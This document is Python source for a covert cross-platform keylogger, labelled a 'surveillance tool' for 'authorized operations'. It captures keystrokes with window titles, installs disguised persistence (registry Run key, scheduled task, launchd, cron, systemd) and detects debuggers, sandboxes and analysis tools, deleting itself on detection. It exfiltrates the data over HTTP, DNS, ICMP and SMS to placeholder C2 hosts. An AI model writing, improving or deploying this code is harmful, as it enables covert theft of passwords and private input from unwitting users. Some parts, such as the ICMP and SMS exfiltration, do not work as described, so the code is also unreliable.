#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Military-Grade Cross-Platform Surveillance Tool
Designed for authorized intelligence operations only
"""

import os
import sys
import time
import json
import random
import platform
import hashlib
import base64
import zlib
import gc
import socket
import struct
import uuid
import logging
import threading
import subprocess
from datetime import datetime
from functools import wraps
from collections import deque, OrderedDict

# ========== PLATFORM-SPECIFIC IMPORTS ==========
PLATFORM = platform.system().lower()
ANDROID = 'linux' in PLATFORM and 'android' in os.environ.get('ANDROID_ROOT', '')
IOS = 'darwin' in PLATFORM and 'iphoneos' in platform.machine().lower()

# Dynamic import system for cross-platform compatibility
def safe_import(module_name, alternative=None):
    try:
        module = __import__(module_name)
        return module
    except ImportError:
        return alternative

# Windows-specific
if PLATFORM == 'windows':
    winreg = safe_import('winreg')
    win32api = safe_import('win32api')
    win32gui = safe_import('win32gui')
    win32process = safe_import('win32process')
    ctypes = safe_import('ctypes')
    
# macOS/iOS-specific
if PLATFORM == 'darwin':
    Foundation = safe_import('Foundation')
    AppKit = safe_import('AppKit')
    Quartz = safe_import('Quartz')
    
# Linux/Android-specific
if PLATFORM == 'linux':
    Xlib = safe_import('Xlib')
    Xlib.display = safe_import('Xlib.display')
    
# Optional components
psutil = safe_import('psutil')
pycryptodome = safe_import('Crypto')
pynput = safe_import('pynput')
requests = safe_import('requests')
urllib3 = safe_import('urllib3')

if urllib3:
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ========== CONFIGURATION ==========
class ConfigManager:
    """Dynamic configuration with polymorphic encoding"""
    def __init__(self):
        self._config = self._load_default_config()
        self._encoder = PolymorphicEncoder()
        
    def _load_default_config(self):
        """Default encrypted configuration"""
        return {
            # Operational parameters
            'active': True,
            'stealth_mode': True,
            'exfil_interval': random.randint(300, 900),
            'max_log_size': random.randint(512000, 2048000),
            'kill_phrase': self._generate_kill_phrase(),
            
            # Exfiltration methods (randomized order)
            'exfil_methods': random.sample(['DNS', 'HTTP', 'ICMP', 'SMS'], k=2),
            
            # Network settings
            'http': {
                'endpoints': [
                    'https://cdn.example[.]com/api/log',
                    'https://api.backup[.]com/v1/collect'
                ],
                'headers': {
                    'User-Agent': random.choice([
                        'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15)',
                        'Mozilla/5.0 (Linux; Android 10; SM-G975F)'
                    ])
                },
                'jitter': random.uniform(0.1, 0.5),
                'timeout': random.randint(15, 45)
            },
            
            'dns': {
                'domains': ['example[.]com', 'backup[.]net'],
                'subdomains': ['data', 'log', 'report'],
                'encoder': random.choice(['base64', 'base32', 'hex'])
            },
            
            # Security settings
            'encryption': {
                'algorithm': 'AES-256-GCM' if pycryptodome else 'XOR',
                'key_rotation': random.randint(3600, 86400)
            },
            
            # Anti-detection
            'anti_analysis': {
                'enabled': True,
                'checks': ['debugger', 'sandbox', 'memory', 'processes']
            },
            
            # Persistence
            'persistence': {
                'enabled': True,
                'methods': self._get_platform_persistence_methods()
            },
            
            # Behavioral
            'polymorphic': {
                'enabled': True,
                'mutation_interval': random.randint(1800, 7200)
            },
            
            # C2 communication
            'beacon': {
                'enabled': True,
                'interval': random.randint(1800, 10800),
                'jitter': random.uniform(0.1, 0.3)
            }
        }
    
    def _generate_kill_phrase(self):
        """Generate random kill phrase"""
        phrases = [
            "THUNDERBOLT",
            "OPERATIONOVER",
            "SHUTDOWNNOW",
            "TERMINATEPROCESS",
            "EXITIMMEDIATELY"
        ]
        return random.choice(phrases)
    
    def _get_platform_persistence_methods(self):
        """Get persistence methods for current platform"""
        if PLATFORM == 'windows':
            return random.sample(['registry', 'scheduled_task', 'service'], k=2)
        elif PLATFORM == 'darwin':
            return ['launchd']
        elif PLATFORM == 'linux':
            if ANDROID:
                return ['android_service']
            return random.sample(['cron', 'systemd', 'profile'], k=2)
        return []
    
    def get_config(self, key=None, default=None):
        """Get configuration value with optional polymorphic decoding"""
        if key is None:
            return self._encoder.decode(self._config)
        
        value = self._config.get(key, default)
        return self._encoder.decode(value) if isinstance(value, (str, bytes)) else value
    
    def update_config(self, new_config):
        """Update configuration with polymorphic encoding"""
        self._config.update(self._encoder.encode(new_config))

class PolymorphicEncoder:
    """Advanced polymorphic encoding/decoding system"""
    def __init__(self):
        self._methods = ['xor', 'b64', 'b32', 'hex']
        self._current_method = random.choice(self._methods)
        self._last_change = time.time()
        
    def encode(self, data):
        """Polymorphic encoding of data"""
        if not isinstance(data, (str, bytes)):
            return data
            
        if isinstance(data, str):
            data = data.encode('utf-8')
            
        # Rotate encoding method periodically
        if time.time() - self._last_change > 3600:
            self._current_method = random.choice(self._methods)
            self._last_change = time.time()
            
        if self._current_method == 'xor':
            key = os.urandom(8)
            return key + bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])
        elif self._current_method == 'b32':
            return b'b32:' + base64.b32encode(data)
        elif self._current_method == 'hex':
            return b'hex:' + data.hex().encode()
        else:  # b64
            return b'b64:' + base64.b64encode(data)
            
    def decode(self, data):
        """Polymorphic decoding of data"""
        if not isinstance(data, (str, bytes)):
            return data
            
        if isinstance(data, str):
            data = data.encode('utf-8')
            
        if data.startswith(b'b64:'):
            return base64.b64decode(data[4:])
        elif data.startswith(b'b32:'):
            return base64.b32decode(data[4:])
        elif data.startswith(b'hex:'):
            return bytes.fromhex(data[4:].decode())
        elif len(data) > 8:  # Assume XOR
            key = data[:8]
            return bytes([b ^ key[i % len(key)] for i, b in enumerate(data[8:])])
        return data

# ========== SECURITY COMPONENTS ==========
class CryptoEngine:
    """Military-grade polymorphic encryption engine"""
    def __init__(self, config):
        self.config = config
        self._key = None
        self._cipher = None
        self._last_rotation = 0
        self._init_crypto()
        
    def _init_crypto(self):
        """Initialize cryptographic components"""
        if pycryptodome:
            from Crypto.Cipher import AES
            from Crypto.Util.Padding import pad, unpad
            self._aes = AES
            self._pad = pad
            self._unpad = unpad
            
            # Derive key from system fingerprint
            password = self._get_system_fingerprint()
            salt = self._get_salt()
            
            # Use PBKDF2 for key derivation
            kdf = hashlib.pbkdf2_hmac(
                'sha512',
                password.encode(),
                salt,
                100000,
                dklen=32
            )
            self._key = kdf
            self._cipher = self._aes.new(self._key, self._aes.MODE_GCM)
        else:
            # Fallback to XOR if crypto libraries not available
            self._key = self._get_system_fingerprint().encode()
            self._key = (self._key * (32 // len(self._key) + 1))[:32]
            
    def _get_system_fingerprint(self):
        """Generate unique system fingerprint"""
        components = [
            platform.node(),
            platform.machine(),
            str(os.getpid()),
            str(uuid.getnode()),
            str(time.time())
        ]
        
        if psutil:
            components.extend([
                str(psutil.cpu_count()),
                str(psutil.virtual_memory().total),
                str(psutil.disk_usage('/').total)
            ])
            
        if ANDROID:
            components.append('android')
        elif IOS:
            components.append('ios')
            
        return hashlib.sha512('|'.join(components).encode()).hexdigest()
        
    def _get_salt(self):
        """Get dynamic salt based on system properties"""
        salt_source = self._get_system_fingerprint()
        return hashlib.sha256(salt_source.encode()).digest()
        
    def encrypt(self, data):
        """Encrypt data with current cipher"""
        if not isinstance(data, bytes):
            data = str(data).encode('utf-8')
            
        # Rotate key if needed
        if time.time() - self._last_rotation > self.config.get_config('encryption')['key_rotation']:
            self._rotate_key()
            
        if pycryptodome:
            cipher = self._aes.new(self._key, self._aes.MODE_GCM)
            ciphertext, tag = cipher.encrypt_and_digest(self._pad(data, 16))
            return base64.b64encode(cipher.nonce + tag + ciphertext)
        else:
            # XOR fallback
            return bytes([b ^ self._key[i % len(self._key)] for i, b in enumerate(data)])
            
    def decrypt(self, data):
        """Decrypt data with current cipher"""
        if not isinstance(data, bytes):
            data = base64.b64decode(data)
            
        if pycryptodome:
            try:
                nonce = data[:16]
                tag = data[16:32]
                ciphertext = data[32:]
                
                cipher = self._aes.new(self._key, self._aes.MODE_GCM, nonce=nonce)
                plaintext = self._unpad(cipher.decrypt_and_verify(ciphertext, tag), 16)
                return plaintext
            except Exception:
                return b''
        else:
            # XOR fallback
            return bytes([b ^ self._key[i % len(self._key)] for i, b in enumerate(data)])
            
    def _rotate_key(self):
        """Rotate encryption key"""
        self._last_rotation = time.time()
        new_fingerprint = self._get_system_fingerprint() + str(time.time())
        self._key = hashlib.sha512(new_fingerprint.encode()).digest()[:32]

# ========== STEALTH COMPONENTS ==========
class AntiAnalysis:
    """Advanced anti-analysis and sandbox detection"""
    def __init__(self, config):
        self.config = config
        self._checks = self.config.get_config('anti_analysis')['checks']
        
    def run_checks(self):
        """Execute all configured anti-analysis checks"""
        results = {}
        
        if 'debugger' in self._checks:
            results['debugger'] = self._check_debugger()
            
        if 'sandbox' in self._checks:
            results['sandbox'] = self._check_sandbox()
            
        if 'memory' in self._checks:
            results['memory'] = self._check_memory()
            
        if 'processes' in self._checks:
            results['processes'] = self._check_suspicious_processes()
            
        if 'network' in self._checks:
            results['network'] = self._check_network()
            
        return results
        
    def _check_debugger(self):
        """Check for debugger presence"""
        if PLATFORM == 'windows':
            try:
                return ctypes.windll.kernel32.IsDebuggerPresent()
            except:
                return False
        else:
            try:
                # Linux/Android debugger check
                with open('/proc/self/status') as f:
                    status = f.read()
                return 'TracerPid:' in status and int(status.split('TracerPid:')[1].split()[0]) > 0
            except:
                return False
                
    def _check_sandbox(self):
        """Check for sandbox/virtual environment"""
        indicators = [
            # Hostname checks
            'sandbox' in platform.node().lower(),
            'vmware' in platform.node().lower(),
            'virtualbox' in platform.node().lower(),
            
            # Environment checks
            'ANDROID_ROOT' in os.environ and not ANDROID,
            'PYCHARM_HOSTED' in os.environ,
            'DEBUG' in os.environ,
            'TEST' in os.environ,
            
            # Process checks
            'pytest' in sys.modules,
            'unittest' in sys.modules,
            
            # Hardware checks
            self._check_virtual_hardware()
        ]
        
        return any(indicators)
        
    def _check_virtual_hardware(self):
        """Check for virtual hardware indicators"""
        if PLATFORM == 'windows':
            try:
                import winreg
                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Enum\PCI") as key:
                    for i in range(winreg.QueryInfoKey(key)[0]):
                        subkey_name = winreg.EnumKey(key, i)
                        if any(vendor in subkey_name.lower() for vendor in ['vmware', 'virtual', 'qemu']):
                            return True
            except:
                pass
        elif PLATFORM == 'linux':
            try:
                with open('/proc/cpuinfo') as f:
                    cpuinfo = f.read()
                return any(vendor in cpuinfo.lower() for vendor in ['vmware', 'virtual', 'qemu'])
            except:
                pass
        return False
        
    def _check_memory(self):
        """Check memory for analysis tools"""
        if not psutil:
            return False
            
        # Check for unusually low memory
        if psutil.virtual_memory().total < 2 * 1024 * 1024 * 1024:  # <2GB
            return True
            
        # Check for recent boot
        if psutil.boot_time() > time.time() - 300:  # <5min uptime
            return True
            
        return False
        
    def _check_suspicious_processes(self):
        """Check for analysis tools running"""
        if not psutil:
            return False
            
        suspicious = [
            'wireshark', 'procmon', 'fiddler', 'ollydbg', 
            'idaq', 'ghidra', 'radare2', 'sysinternals',
            'burp', 'charles', 'mitmproxy', 'frida'
        ]
        
        try:
            for proc in psutil.process_iter(['name']):
                if any(s in proc.info['name'].lower() for s in suspicious):
                    return True
        except:
            pass
            
        return False
        
    def _check_network(self):
        """Check network for monitoring"""
        try:
            # Check for unusual DNS servers
            if PLATFORM == 'windows':
                import winreg
                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces") as key:
                    for i in range(winreg.QueryInfoKey(key)[0]):
                        interface_key = winreg.OpenKey(key, winreg.EnumKey(key, i))
                        try:
                            dns = winreg.QueryValueEx(interface_key, 'NameServer')[0]
                            if 'analysis' in dns.lower() or 'sandbox' in dns.lower():
                                return True
                        except:
                            continue
            return False
        except:
            return False

# ========== PERSISTENCE MECHANISMS ==========
class PersistenceManager:
    """Advanced cross-platform persistence"""
    def __init__(self, config):
        self.config = config
        self._methods = self.config.get_config('persistence')['methods']
        
    def install(self):
        """Install persistence mechanisms"""
        if not self.config.get_config('persistence')['enabled']:
            return False
            
        if PLATFORM == 'windows':
            return self._install_windows()
        elif PLATFORM == 'darwin':
            return self._install_macos()
        elif PLATFORM == 'linux':
            if ANDROID:
                return self._install_android()
            return self._install_linux()
        return False
        
    def _install_windows(self):
        """Windows persistence methods"""
        success = False
        
        if 'registry' in self._methods:
            try:
                import winreg
                key = winreg.HKEY_CURRENT_USER
                path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                with winreg.OpenKey(key, path, 0, winreg.KEY_WRITE) as regkey:
                    winreg.SetValueEx(
                        regkey, 
                        "WindowsUpdate", 
                        0, 
                        winreg.REG_SZ, 
                        sys.executable
                    )
                success = True
            except:
                pass
                
        if 'scheduled_task' in self._methods:
            try:
                cmd = [
                    'schtasks', '/create', '/tn', 'MicrosoftUpdater',
                    '/tr', f'"{sys.executable}"', '/sc', 'onlogon',
                    '/ru', 'System', '/f'
                ]
                subprocess.run(cmd, check=True, capture_output=True)
                success = True
            except:
                pass
                
        if 'service' in self._methods:
            try:
                service_name = "WindowsUpdateService"
                bin_path = os.path.abspath(sys.executable)
                
                cmd = [
                    'sc', 'create', service_name,
                    'binPath=', bin_path,
                    'start=', 'auto'
                ]
                subprocess.run(cmd, check=True, capture_output=True)
                success = True
            except:
                pass
                
        return success
        
    def _install_macos(self):
        """macOS persistence methods"""
        try:
            plist = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.softwareupdate</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>AbandonProcessGroup</key>
    <true/>
</dict>
</plist>"""
            
            dest = os.path.expanduser("~/Library/LaunchAgents/com.apple.softwareupdate.plist")
            with open(dest, "w") as f:
                f.write(plist)
            subprocess.run(["launchctl", "load", dest], check=True)
            return True
        except:
            return False
            
    def _install_linux(self):
        """Linux persistence methods"""
        success = False
        
        if 'cron' in self._methods:
            try:
                cron_line = f"@reboot {sys.executable}"
                with open("/etc/cron.d/.systemupdate", "w") as f:
                    f.write(cron_line + "\n")
                success = True
            except:
                try:
                    cmd = f'(crontab -l 2>/dev/null; echo "{cron_line}") | crontab -'
                    subprocess.run(cmd, shell=True, check=True)
                    success = True
                except:
                    pass
                    
        if 'systemd' in self._methods:
            try:
                service_file = f"""
                [Unit]
                Description=System Update Service
                After=network.target
                
                [Service]
                ExecStart={sys.executable}
                Restart=always
                User=root
                RestartSec=60
                
                [Install]
                WantedBy=multi-user.target
                """
                
                with open("/etc/systemd/system/.system-update.service", "w") as f:
                    f.write(service_file)
                subprocess.run(["systemctl", "enable", ".system-update.service"], check=True)
                success = True
            except:
                pass
                
        if 'profile' in self._methods:
            try:
                profile_line = f"{sys.executable} &"
                with open(os.path.expanduser("~/.profile"), "a") as f:
                    f.write("\n" + profile_line + "\n")
                success = True
            except:
                pass
                
        return success
        
    def _install_android(self):
        """Android persistence methods"""
        try:
            # Requires appropriate permissions
            service_name = "com.android.systemupdater/.UpdateService"
            subprocess.run(["am", "startservice", service_name], check=True)
            return True
        except:
            return False

# ========== EXFILTRATION METHODS ==========
class Exfiltrator:
    """Advanced polymorphic data exfiltration"""
    def __init__(self, config, crypto):
        self.config = config
        self.crypto = crypto
        self._methods = self.config.get_config('exfil_methods')
        self._current_method = random.choice(self._methods)
        self._last_exfil = 0
        self._http_endpoints = self.config.get_config('http')['endpoints']
        self._dns_domains = self.config.get_config('dns')['domains']
        
    def exfiltrate(self, data):
        """Exfiltrate data using available methods"""
        if not data:
            return False
            
        # Encrypt and compress data
        encrypted = self.crypto.encrypt(json.dumps(data).encode())
        compressed = zlib.compress(encrypted)
        
        # Rotate methods for operational security
        if random.random() < 0.3:  # 30% chance to rotate
            self._current_method = random.choice(self._methods)
            
        # Try current method first, then fallback
        methods = [self._current_method] + [m for m in self._methods if m != self._current_method]
        
        for method in methods:
            try:
                if method == 'HTTP':
                    if self._exfil_http(compressed):
                        return True
                elif method == 'DNS':
                    if self._exfil_dns(compressed):
                        return True
                elif method == 'ICMP':
                    if self._exfil_icmp(compressed):
                        return True
                elif method == 'SMS' and ANDROID:
                    if self._exfil_sms(compressed):
                        return True
            except Exception:
                continue
                
        return False
        
    def _exfil_http(self, data):
        """HTTP/S exfiltration with domain fronting"""
        if not requests:
            return False
            
        http_config = self.config.get_config('http')
        endpoint = random.choice(self._http_endpoints)
        
        # Add jitter to avoid pattern detection
        time.sleep(http_config['jitter'] * random.random())
        
        try:
            headers = http_config['headers'].copy()
            params = {
                'id': self.crypto._get_system_fingerprint(),
                't': int(time.time())
            }
            
            # Randomize HTTP method
            method = random.choice(['POST', 'GET'])
            
            if method == 'POST':
                response = requests.post(
                    endpoint,
                    data=data,
                    headers=headers,
                    params=params,
                    verify=False,
                    timeout=http_config['timeout']
                )
            else:
                # GET request with data in URL parameters
                params['d'] = base64.urlsafe_b64encode(data).decode()
                response = requests.get(
                    endpoint,
                    headers=headers,
                    params=params,
                    verify=False,
                    timeout=http_config['timeout']
                )
                
            return response.status_code == 200
        except Exception:
            return False
            
    def _exfil_dns(self, data):
        """DNS exfiltration using various encoding techniques"""
        dns_config = self.config.get_config('dns')
        domain = random.choice(self._dns_domains)
        encoder = dns_config['encoder']
        subdomains = dns_config['subdomains']
        
        try:
            # Encode data according to config
            if encoder == 'hex':
                encoded = data.hex()
            elif encoder == 'base32':
                encoded = base64.b32encode(data).decode().rstrip('=')
            else:  # Default to base64
                encoded = base64.urlsafe_b64encode(data).decode().rstrip('=')
                
            # Split into chunks that fit in DNS labels (max 63 chars)
            chunk_size = 50  # Conservative estimate
            chunks = [
                encoded[i:i+chunk_size] 
                for i in range(0, len(encoded), chunk_size)
            ]
            
            # Resolve each chunk as a subdomain
            for i, chunk in enumerate(chunks):
                subdomain = subdomains[i % len(subdomains)]
                hostname = f"{chunk}.{subdomain}.{domain}"
                try:
                    socket.gethostbyname(hostname)
                    time.sleep(random.uniform(0.1, 0.5))  # Add delay between requests
                except:
                    continue
                    
            return True
        except Exception:
            return False
            
    def _exfil_icmp(self, data):
        """ICMP exfiltration (ping payload)"""
        try:
            # Split data into ping-sized chunks (56 bytes typical)
            chunk_size = 56
            chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
            
            # Get random target IP (could be configured)
            target_ip = socket.gethostbyname(random.choice(self._dns_domains))
            
            # Send each chunk as ICMP packet
            for chunk in chunks:
                if PLATFORM == 'windows':
                    subprocess.run(['ping', '-n', '1', '-l', str(len(chunk)), target_ip], 
                                  check=True, capture_output=True)
                else:
                    subprocess.run(['ping', '-c', '1', '-s', str(len(chunk)), target_ip], 
                                  check=True, capture_output=True)
                time.sleep(random.uniform(0.1, 0.3))
                
            return True
        except Exception:
            return False
            
    def _exfil_sms(self, data):
        """Android SMS exfiltration (requires permissions)"""
        try:
            # Encode data for SMS
            encoded = base64.b64encode(data).decode()
            
            # Split into SMS-sized chunks (140 chars)
            chunk_size = 140
            chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
            
            # Get C2 number from config (would be pre-configured)
            c2_number = "+1234567890"
            
            # Send each chunk as SMS
            for chunk in chunks:
                subprocess.run([
                    'am', 'startservice',
                    '-n', 'com.android.sms/.SendSMS',
                    '-e', 'number', c2_number,
                    '-e', 'message', chunk
                ], check=True)
                time.sleep(random.uniform(1, 3))  # Avoid rate limiting
                
            return True
        except Exception:
            return False

# ========== KEYLOGGER CORE ==========
class KeyloggerCore:
    """Advanced cross-platform keylogger"""
    def __init__(self, config):
        self.config = config
        self.crypto = CryptoEngine(config)
        self.exfiltrator = Exfiltrator(config, self.crypto)
        self.anti_analysis = AntiAnalysis(config)
        self.persistence = PersistenceManager(config)
        
        self._buffer = []
        self._last_flush = 0
        self._running = False
        self._listener = None
        
        # Initial security checks
        self._security_checks()
        
        # Install persistence
        self._install_persistence()
        
    def _security_checks(self):
        """Run security checks and respond appropriately"""
        if not self.config.get_config('anti_analysis')['enabled']:
            return
            
        checks = self.anti_analysis.run_checks()
        if any(checks.values()):
            if self.config.get_config('stealth_mode'):
                self._self_destruct()
                
    def _install_persistence(self):
        """Install persistence mechanisms"""
        if not self.persistence.install():
            pass  # Silent failure
            
    def _self_destruct(self):
        """Clean up and exit safely"""
        try:
            # Clear buffer
            self._buffer = []
            
            # Remove executable if possible
            if random.random() < 0.3:  # 30% chance to self-delete
                try:
                    if PLATFORM == 'windows':
                        cmd = f"ping 127.0.0.1 -n 3 > nul & del /f /q \"{sys.argv[0]}\""
                        subprocess.Popen(cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
                    else:
                        cmd = f"sleep 3; rm -f \"{sys.argv[0]}\""
                        subprocess.Popen(cmd, shell=True)
                except:
                    pass
                    
            # Exit
            sys.exit(0)
        except:
            sys.exit(0)
            
    def _get_active_window(self):
        """Get current active window title"""
        if PLATFORM == 'windows':
            try:
                import win32gui
                return win32gui.GetWindowText(win32gui.GetForegroundWindow())
            except:
                return "Unknown"
        elif PLATFORM == 'darwin':
            try:
                return AppKit.NSWorkspace.sharedWorkspace().activeApplication()['NSApplicationName']
            except:
                return "Unknown"
        elif PLATFORM == 'linux':
            try:
                display = Xlib.display.Display()
                window = display.get_input_focus().focus
                return window.get_wm_name() or "Unknown"
            except:
                return "Unknown"
        return "Unknown"
        
    def _on_key_event(self, key):
        """Handle key press events"""
        try:
            window = self._get_active_window()
            
            event = {
                'timestamp': datetime.utcnow().isoformat() + 'Z',
                'window': window,
                'key': str(key),
                'type': 'press'
            }
            
            self._buffer.append(event)
            
            # Check for kill phrase
            if len(self._buffer) > 10:
                last_keys = ''.join(
                    e['key'] for e in self._buffer[-10:] 
                    if len(e.get('key', '')) == 1
                )
                if self.config.get_config('kill_phrase') in last_keys:
                    self._self_destruct()
                    
            # Auto-flush if buffer too large or time elapsed
            if (len(self._buffer) >= self.config.get_config('max_log_size') or 
                (time.time() - self._last_flush) >= self.config.get_config('exfil_interval')):
                self._flush_buffer()
                
        except Exception:
            pass
            
    def _flush_buffer(self):
        """Flush buffer to exfiltration"""
        if not self._buffer:
            return
            
        try:
            data = {
                'events': self._buffer,
                'system': {
                    'platform': PLATFORM,
                    'hostname': platform.node(),
                    'user': os.getlogin() if hasattr(os, 'getlogin') else 'unknown'
                },
                'timestamp': datetime.utcnow().isoformat() + 'Z'
            }
            
            if self.exfiltrator.exfiltrate(data):
                self._buffer = []
                self._last_flush = time.time()
        except Exception:
            pass
            
    def start(self):
        """Start the keylogger"""
        if not pynput:
            return False
            
        self._running = True
        
        # Initial random delay
        time.sleep(random.uniform(0, 5))
        
        # Start keyboard listener
        self._listener = pynput.keyboard.Listener(on_press=self._on_key_event)
        self._listener.start()
        
        # Start periodic tasks
        threading.Thread(target=self._periodic_tasks, daemon=True).start()
        
        # Keep main thread alive
        while self._running:
            time.sleep(1)
            
        return True
        
    def stop(self):
        """Stop the keylogger"""
        self._running = False
        if self._listener:
            self._listener.stop()
            
    def _periodic_tasks(self):
        """Handle periodic tasks like beaconing and buffer flushing"""
        while self._running:
            try:
                # Beacon home if configured
                if self.config.get_config('beacon')['enabled']:
                    interval = self.config.get_config('beacon')['interval']
                    jitter = interval * self.config.get_config('beacon')['jitter']
                    next_beacon = interval + random.uniform(-jitter, jitter)
                    
                    if time.time() - self._last_flush > next_beacon:
                        self._send_beacon()
                        
                # Regular buffer flush
                if self._buffer and (time.time() - self._last_flush) > 60:
                    self._flush_buffer()
                    
                time.sleep(10)
            except Exception:
                time.sleep(30)
                
    def _send_beacon(self):
        """Send beacon to C2 server"""
        beacon = {
            'timestamp': datetime.utcnow().isoformat() + 'Z',
            'host': platform.node(),
            'user': os.getlogin() if hasattr(os, 'getlogin') else 'unknown',
            'status': 'active',
            'platform': PLATFORM
        }
        
        if psutil:
            beacon.update({
                'uptime': int(time.time() - psutil.boot_time()),
                'cpu': psutil.cpu_percent(),
                'memory': psutil.virtual_memory().percent
            })
            
        self.exfiltrator.exfiltrate(beacon)
        self._last_flush = time.time()

# ========== MAIN FUNCTION ==========
def main():
    """Entry point with anti-sandbox and evasion techniques"""
    # Initial random delay
    delay = random.randint(0, 300) + random.random() * 60
    time.sleep(delay)
    
    # Load configuration
    config = ConfigManager()
    
    # Initialize and run keylogger
    keylogger = KeyloggerCore(config)
    try:
        keylogger.start()
    except KeyboardInterrupt:
        keylogger.stop()
    except Exception:
        keylogger._self_destruct()

if __name__ == "__main__":
    # Anti-debugging technique
    if hasattr(sys, 'gettrace') and sys.gettrace():
        sys.exit(0)
        
    # Run as daemon
    if os.fork():
        sys.exit(0)
        
    main()